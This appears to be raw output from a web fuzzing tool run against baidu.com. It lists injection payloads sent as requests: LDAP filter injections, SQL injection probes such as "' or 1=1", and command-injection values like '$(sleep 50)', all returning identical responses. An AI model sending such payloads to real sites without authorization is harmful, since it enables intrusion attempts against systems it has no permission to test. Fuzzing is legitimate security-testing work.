Target: http://baidu.com/
Total requests: 125
==================================================================
ID    Response   Lines      Word         Chars          Request    
00103:  C=200      3 L         5 W           81 Ch        "|"
00117:  C=200      3 L         5 W           81 Ch        "!"
00118:  C=200      3 L         5 W           81 Ch        "%21"
00116:  C=200      3 L         5 W           81 Ch        "%26"
00115:  C=200      3 L         5 W           81 Ch        "&"
00114:  C=200      3 L         5 W           81 Ch        "%29"
00113:  C=200      3 L         5 W           81 Ch        ")"
00112:  C=200      3 L         5 W           81 Ch        "%28"
00111:  C=200      3 L         5 W           81 Ch        "("
00110:  C=200      3 L         5 W           81 Ch        "%2A%28%7C%28objectclass%3D%2A%29%29"
00109:  C=200      3 L         5 W           81 Ch        "*(|(objectclass=*))"
00108:  C=200      3 L         5 W           81 Ch        "%2A%28%7C%28mail%3D%2A%29%29"
00107:  C=200      3 L         5 W           81 Ch        "*(|(mail=*))"
00106:  C=200      3 L         5 W           81 Ch        "%2A%7C"
00105:  C=200      3 L         5 W           81 Ch        "*|"
00095:  C=200      3 L         5 W           81 Ch        "'%20or%201=1"
00101:  C=200      3 L         5 W           81 Ch        "'sqlattempt1"
00102:  C=200      3 L         5 W           81 Ch        "(sqlattempt2)"
00100:  C=200      3 L         5 W           81 Ch        "&apos;%20OR"
00099:  C=200      3 L         5 W           81 Ch        "char%4039%41%2b%40SELECT"
00098:  C=200      3 L         5 W           81 Ch        "%20'sleep%2050'"
00097:  C=200      3 L         5 W           81 Ch        "%20$(sleep%2050)"
00091:  C=200      3 L         5 W           81 Ch        "1;SELECT%20*"
00093:  C=200      3 L         5 W           81 Ch        "tz_offset"
00094:  C=200      3 L         5 W           81 Ch        "&lt;&gt;&quot;'%;)(&amp;+"

Total time: 0
Processed Requests: 125
Filtered Requests: 0
Requests/sec.: 0
